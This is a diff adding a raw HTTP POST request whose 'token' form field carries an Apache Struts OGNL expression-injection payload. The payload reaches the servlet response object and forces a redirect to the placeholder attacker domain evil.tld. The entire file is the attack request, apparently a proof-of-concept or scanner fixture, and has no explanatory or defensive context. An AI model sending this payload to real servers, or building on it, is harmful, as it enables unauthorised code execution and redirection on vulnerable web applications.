@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 124
+Connection: close
+
+token=#context[\u0027com.opensymphony.xwork2.dispatcher.HttpServletResponse\u0027].sendRedirect(\u0027http://evil.tld\u0027)
